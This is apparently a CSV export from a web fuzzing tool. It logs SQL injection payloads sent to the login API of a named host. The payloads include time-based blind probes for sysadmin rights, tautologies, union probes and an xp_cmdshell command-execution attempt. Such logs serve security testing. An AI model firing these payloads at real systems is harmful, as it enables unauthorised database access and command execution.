Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
364,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,131,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
365,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,120,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
366,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,115,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
356,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,414,633,101,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, a' or 1=1; --]"
368,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,137,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
359,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,393,633,108,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, ' and 1=0) union all]"
369,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,91,544,14,,Reflected,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , a]"
370,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,93,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , a' ]"
371,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,95,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , a' --]"
372,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,103,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , a' or 1=1; --]"
373,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,632,91,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , @]"
375,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,110,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , ' and 1=0) union all]"
374,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,91,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , ?]"
367,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,355,633,101,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, 23 or 1=1; --]"
379,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,109,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , anything' or 'x'='x]"
378,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,114,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , x' and email is NULL; --]"
380,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,133,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , x' and 1=(select count(*) from tabname); --]"
381,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,122,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , x' and members.email is NULL; --]"
385,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,119,544,14,,Reflected,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, a]"
382,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,117,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , x' or full_name like '%bob%]"
383,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,103,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , 23 or 1=1; --]"
384,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,139,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
386,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,121,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, a' ]"
377,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,359,633,115,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , x' and userid is NULL; --]"
387,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,123,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, a' --]"
376,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,413,633,101,544,14,,,"['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- , ? or 1=1 --]"
388,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,131,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, a' or 1=1; --]"
391,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,633,138,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, ' and 1=0) union all]"
392,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,129,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, ? or 1=1 --]"
393,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,143,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
395,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,137,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, anything' or 'x'='x]"
394,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,142,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, x' and email is NULL; --]"
398,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,145,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
396,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,161,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
397,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,150,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
399,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,131,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, 23 or 1=1; --]"
390,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,344,633,119,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, ?]"
400,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,167,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
389,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,429,633,119,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --, @]"
401,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,119,544,14,,Reflected,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, a]"
402,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,121,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, a' ]"
404,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,131,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, a' or 1=1; --]"
405,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,91,633,119,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, @]"
403,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,123,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, a' --]"
409,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,633,143,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
406,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,119,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, ?]"
408,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,129,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, ? or 1=1 --]"
407,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,138,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, ' and 1=0) union all]"
410,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,142,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, x' and email is NULL; --]"
412,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,161,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
350,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1556,633,128,722,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
411,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,137,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, anything' or 'x'='x]"
414,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,145,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
413,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,150,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
415,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,131,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, 23 or 1=1; --]"
417,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,28,544,14,,Reflected,"[1, a]"
419,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,32,544,14,,,"[1, a' --]"
423,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,47,544,14,,,"[1, ' and 1=0) union all]"
420,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,40,544,14,,,"[1, a' or 1=1; --]"
421,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,28,544,14,,,"[1, @]"
422,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,28,544,14,,,"[1, ?]"
425,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,52,544,14,,,"[1, x' and userid is NULL; --]"
424,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,38,544,14,,,"[1, ? or 1=1 --]"
427,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,46,544,14,,,"[1, anything' or 'x'='x]"
428,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,70,544,14,,,"[1, x' and 1=(select count(*) from tabname); --]"
416,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,360,633,167,544,14,,,"['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
418,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,363,632,30,544,14,,,"[1, a' ]"
430,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,632,54,544,14,,,"[1, x' or full_name like '%bob%]"
433,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,30,544,14,,Reflected,"[1'1, a]"
431,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,40,544,14,,,"[1, 23 or 1=1; --]"
432,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,76,544,14,,,"[1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
434,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,32,544,14,,,"[1'1, a' ]"
436,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,42,544,14,,,"[1'1, a' or 1=1; --]"
435,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,34,544,14,,,"[1'1, a' --]"
437,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,30,544,14,,,"[1'1, @]"
438,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,30,544,14,,,"[1'1, ?]"
439,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,49,544,14,,,"[1'1, ' and 1=0) union all]"
440,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,40,544,14,,,"[1'1, ? or 1=1 --]"
426,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,428,632,51,544,14,,,"[1, x' and email is NULL; --]"
444,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,632,72,544,14,,,"[1'1, x' and 1=(select count(*) from tabname); --]"
442,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,53,544,14,,,"[1'1, x' and email is NULL; --]"
441,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,128,632,54,544,14,,,"[1'1, x' and userid is NULL; --]"
445,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,61,544,14,,,"[1'1, x' and members.email is NULL; --]"
443,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,48,544,14,,,"[1'1, anything' or 'x'='x]"
447,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,42,544,14,,,"[1'1, 23 or 1=1; --]"
446,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,56,544,14,,,"[1'1, x' or full_name like '%bob%]"
449,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,51,544,14,,Reflected,"[1 exec sp_ (or exec xp_), a]"
448,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,78,544,14,,,"[1'1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
451,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,55,544,14,,,"[1 exec sp_ (or exec xp_), a' --]"
452,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,632,63,544,14,,,"[1 exec sp_ (or exec xp_), a' or 1=1; --]"
453,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,51,544,14,,,"[1 exec sp_ (or exec xp_), @]"
429,Fuzzed,Sat Jan 11 17:02:43 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,634,632,59,544,14,,,"[1, x' and members.email is NULL; --]"
454,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,127,632,51,544,14,,,"[1 exec sp_ (or exec xp_), ?]"
455,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,70,544,14,,,"[1 exec sp_ (or exec xp_), ' and 1=0) union all]"
457,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,75,544,14,,,"[1 exec sp_ (or exec xp_), x' and userid is NULL; --]"
456,Fuzzed,Sat Jan 11 17:02:44 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,61,544,14,,,"[1 exec sp_ (or exec xp_), ? or 1=1 --]"
